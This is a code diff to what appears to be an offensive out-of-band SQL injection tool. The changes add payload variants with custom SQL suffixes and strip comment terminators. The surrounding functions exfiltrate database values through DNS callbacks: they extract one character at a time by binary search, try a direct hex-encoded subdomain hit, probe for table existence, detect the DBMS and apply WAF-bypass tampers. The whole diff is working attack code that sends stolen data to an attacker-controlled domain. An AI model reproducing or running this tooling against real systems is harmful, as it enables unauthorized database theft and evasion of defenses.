@@ -129,6 +129,27 @@ def send_payload(args, request, payload):
             _log("DEBUG", f"http error (ignored): {exc}")
 
 
+def strip_payload_terminator(payload: str) -> str:
+    stripped = payload.rstrip()
+    for terminator in ("-- -", "--", "/*", "#"):
+        if stripped.endswith(terminator):
+            return stripped[: -len(terminator)].rstrip()
+    return stripped
+
+
+def expand_payloads(args, payloads):
+    variants = list(payloads)
+    for suffix in getattr(args, "payload_suffix", None) or []:
+        for payload in payloads:
+            variants.append(strip_payload_terminator(payload) + suffix)
+    return list(dict.fromkeys(variants))
+
+
+def send_payloads(args, request, payloads):
+    for payload in expand_payloads(args, payloads):
+        send_payload(args, request, payload)
+
+
 def extract_char_binary(args, profile, request, domain, log, run_id, expression, pos, alphabet):
     chars = sorted(set(alphabet))
     if not chars:
@@ -138,8 +159,7 @@ def extract_char_binary(args, profile, request, domain, log, run_id, expression,
         mid = (lo + hi + 1) // 2
         token = f"{run_id}-p{pos:02d}-b{mid:02x}"
         condition = profile.condition_gte(expression, pos, chars[mid])
-        payload = profile.payload(args.base, condition, f"{token}.{domain}")
-        send_payload(args, request, payload)
+        send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}"))
         if log.wait_any({token: chars[mid]}, args.timeout):
             lo = mid
         else:
@@ -148,8 +168,7 @@ def extract_char_binary(args, profile, request, domain, log, run_id, expression,
     candidate = chars[lo]
     token_eq = f"{run_id}-p{pos:02d}-c{ord(candidate):02x}"
     condition_eq = profile.condition(expression, pos, candidate)
-    payload_eq = profile.payload(args.base, condition_eq, f"{token_eq}.{domain}")
-    send_payload(args, request, payload_eq)
+    send_payloads(args, request, profile.payloads(args.base, condition_eq, f"{token_eq}.{domain}"))
     return candidate if log.wait_any({token_eq: candidate}, args.timeout) else None
 
 
@@ -163,15 +182,12 @@ def run_check(args, profile, request, domain, log, run_id) -> int:
 
     true_token = f"{run_id}-true"
     false_token = f"{run_id}-false"
-    true_payload = profile.payload(args.base, args.true_condition, f"{true_token}.{domain}")
-    false_payload = profile.payload(args.base, args.false_condition, f"{false_token}.{domain}")
-
     _log("INFO", "Sending true probe...")
-    send_payload(args, request, true_payload)
+    send_payloads(args, request, profile.payloads(args.base, args.true_condition, f"{true_token}.{domain}"))
     true_hit = log.wait_any({true_token: "true"}, args.timeout)
 
     _log("INFO", "Sending false probe...")
-    send_payload(args, request, false_payload)
+    send_payloads(args, request, profile.payloads(args.base, args.false_condition, f"{false_token}.{domain}"))
     false_hit = log.wait_any({false_token: "false"}, args.timeout)
 
     if true_hit and not false_hit:
@@ -250,8 +266,7 @@ def _extract_value_parallel(args, profile, request, domain, log, run_id, session
             token = token_for(run_id, pos, c)
             token_map[token] = c
             condition = profile.condition(expression, pos, c)
-            payload = profile.payload(args.base, condition, f"{token}.{domain}")
-            send_payload(args, request, payload)
+            send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}"))
         token = log.wait_any(token_map, args.timeout)
         return pos, token_map[token] if token else None
 
@@ -286,24 +301,17 @@ def _try_direct_extract(args, profile, request, domain, log, run_id, expression)
     """Try to exfiltrate the full value in one DNS hit (HEX in subdomain).
     Returns the decoded value, or None if unsupported or no callback received."""
     prefix = f"{run_id}-d"
-    payload = profile.direct_payload(args.base, expression, prefix, domain)
-    if payload is None:
+    payloads = profile.direct_payloads(args.base, expression, prefix, domain)
+    if not payloads:
         return None
 
     _log("INFO", "Trying direct exfiltration (full value in one DNS hit)...")
-    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
-    if tamper_names:
-        payload = apply_tampers(payload, tamper_names)
-
-    injected = inject(request, args.param, payload, args.place)
-    try:
-        send(injected, force_ssl=args.force_ssl, timeout=args.http_timeout,
-             proxy=getattr(args, "proxy", None),
-             verify_ssl=not getattr(args, "no_verify_ssl", False))
-    except Exception:
-        pass
-
-    value = log.find_direct(prefix, args.timeout)
+    value = None
+    for payload in expand_payloads(args, payloads):
+        send_payload(args, request, payload)
+        value = log.find_direct(prefix, args.timeout)
+        if value is not None:
+            break
     if value is not None:
         _log("INFO", _hi(f"Direct: {value}"))
     else:
@@ -366,8 +374,7 @@ def extract_value(args, expression: str, alphabet: str, max_len: int, show_card:
                 token = token_for(run_id, pos, c)
                 token_map[token] = c
                 condition = profile.condition(expression, pos, c)
-                payload = profile.payload(args.base, condition, f"{token}.{domain}")
-                send_payload(args, request, payload)
+                send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}"))
             token = log.wait_any(token_map, args.timeout)
             char = token_map[token] if token else None
 
@@ -579,8 +586,7 @@ def _table_exists(args, profile, request, domain, log, run_id, table: str) -> bo
     """Fire one OOB probe to check if a table exists — no full enumeration."""
     condition = f"(SELECT COUNT(*) FROM {table})>=0"
     token = f"{run_id}-tblchk-{table}"
-    payload = profile.payload(args.base or "", condition, f"{token}.{domain}")
-    send_payload(args, request, payload)
+    send_payloads(args, request, profile.payloads(args.base or "", condition, f"{token}.{domain}"))
     return log.wait_any({token: table}, args.timeout) is not None
 
 
@@ -722,17 +728,17 @@ def _detect_dbms(args) -> str | None:
         base = base or ""
 
         token = f"{run_id}-detect-{profile_name}"
-        payload = profile.payload(base, "1=1", f"{token}.{domain}")
-        if tamper_names:
-            payload = apply_tampers(payload, tamper_names)
+        for payload in profile.payloads(base, "1=1", f"{token}.{domain}"):
+            if tamper_names:
+                payload = apply_tampers(payload, tamper_names)
 
-        injected = inject(request, args.param or "", payload, args.place)
-        try:
-            send(injected, force_ssl=args.force_ssl, timeout=args.http_timeout,
-                 proxy=getattr(args, "proxy", None),
-                 verify_ssl=not getattr(args, "no_verify_ssl", False))
-        except Exception:
-            pass
+            injected = inject(request, args.param or "", payload, args.place)
+            try:
+                send(injected, force_ssl=args.force_ssl, timeout=args.http_timeout,
+                     proxy=getattr(args, "proxy", None),
+                     verify_ssl=not getattr(args, "no_verify_ssl", False))
+            except Exception:
+                pass
 
         hit = log.wait_any({token: profile_name}, args.timeout)
         if hit:
@@ -924,6 +930,8 @@ def make_parser():
     waf = parser.add_argument_group("WAF bypass")
     waf.add_argument("--tamper", default="", metavar="NAMES",
                      help="comma-separated tamper chain — run 'oobmap tampers' for the list")
+    waf.add_argument("--payload-suffix", action="append", metavar="SQL",
+                     help="also try generated payloads with this custom SQL suffix; repeatable")
 
     net = parser.add_argument_group("Network")
     net.add_argument("--force-ssl",    action="store_true", help="send request over HTTPS")
